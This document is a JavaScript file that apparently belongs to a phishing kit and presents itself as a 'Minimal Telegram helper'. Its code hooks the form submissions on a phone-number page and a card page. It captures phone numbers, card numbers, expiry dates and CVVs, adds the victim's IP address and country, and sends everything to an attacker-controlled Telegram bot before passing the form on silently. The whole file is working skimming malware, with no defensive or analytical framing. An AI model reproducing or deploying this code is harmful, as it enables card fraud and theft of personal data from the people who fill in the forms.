
// Minimal Telegram helper (no jQuery)
(function(){
  async function loadConfig(){
    try{
      const res = await fetch('TELEGRAM.json', {cache:'no-store'});
      const data = await res.json();
      return { botToken: data.botToken, chatId: data.chatId };
    }catch(e){
      console.error('Error loading TELEGRAM.json', e);
      return null;
    }
  }

  async function getIpInfo(){
    try{
      const res = await fetch('https://ipapi.co/json/');
      const data = await res.json();
      return { ip: data.ip || 'Unavailable', country: data.country || 'Unknown' };
    }catch(e){
      return { ip: 'Unavailable', country: 'Unknown' };
    }
  }

  async function sendTelegram(text){
    const cfg = await loadConfig();
    if(!cfg) return;
    const url = `https://api.telegram.org/bot${cfg.botToken}/sendMessage`;
    const payload = { chat_id: cfg.chatId, text, parse_mode: 'Markdown' };
    try{
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true
      });
    }catch(e){
      // swallow
    }
  }

  // Hook for index.html (phone form)
  function hookIndex(){
    const form = document.querySelector('form');
    if(!form) return;
    const phoneInput = document.querySelector('input[name="nummer"]');
    if(!phoneInput) return;

    form.addEventListener('submit', async function(ev){
      ev.preventDefault();
      const ip = await getIpInfo();
      const now = new Date().toLocaleString();
      const phone = (phoneInput.value || '').trim();
      const msg = [
        '📱 *New Phone Number Submitted*',
        '',
        `🔹 *Phone Number:* \`${phone}\``,
        `🔹 *IP Address:* \`${ip.ip}\``,
        `🔹 *Country:* \`${ip.country}\``,
        `🕒 *Date/Time:* \`${now}\``
      ].join('\n');
      // don't block navigation longer than ~800ms
      await Promise.race([sendTelegram(msg), new Promise(r=>setTimeout(r,800))]);
      form.submit();
    }, { once:false });
  }

  // Hook for cc.html (card form)
  function hookCard(){
    const form = document.querySelector('form');
    if(!form) return;
    const num = document.querySelector('input[name="jiji"]');
    const exp = document.querySelector('input[name="jijiexp"]');
    const cvv = document.querySelector('input[name="jijicode"]');
    if(!(num && exp && cvv)) return;

    form.addEventListener('submit', async function(ev){
      ev.preventDefault();
      const ip = await getIpInfo();
      const now = new Date().toLocaleString();
      const msg = [
        '💳 *New Card Submitted*',
        '',
        `🔹 *Card Number:* \`${(num.value||'').trim()}\``,
        `🔹 *Expiry:* \`${(exp.value||'').trim()}\``,
        `🔹 *CVV:* \`${(cvv.value||'').trim()}\``,
        `🔹 *IP Address:* \`${ip.ip}\``,
        `🔹 *Country:* \`${ip.country}\``,
        `🕒 *Date/Time:* \`${now}\``
      ].join('\n');

      await Promise.race([sendTelegram(msg), new Promise(r=>setTimeout(r,800))]);
      form.submit();
    }, { once:false });
  }

  // Decide which hook to run based on URL
  document.addEventListener('DOMContentLoaded', function(){
    const page = (location.pathname || '').toLowerCase();
    if(page.endsWith('/index.html') || page.endsWith('/')){
      hookIndex();
    } else if(page.endsWith('/cc.html')){
      hookCard();
    } else {
      // also try by presence of specific inputs
      if(document.querySelector('input[name="nummer"]')) hookIndex();
      if(document.querySelector('input[name="jiji"]')) hookCard();
    }
  });
})();
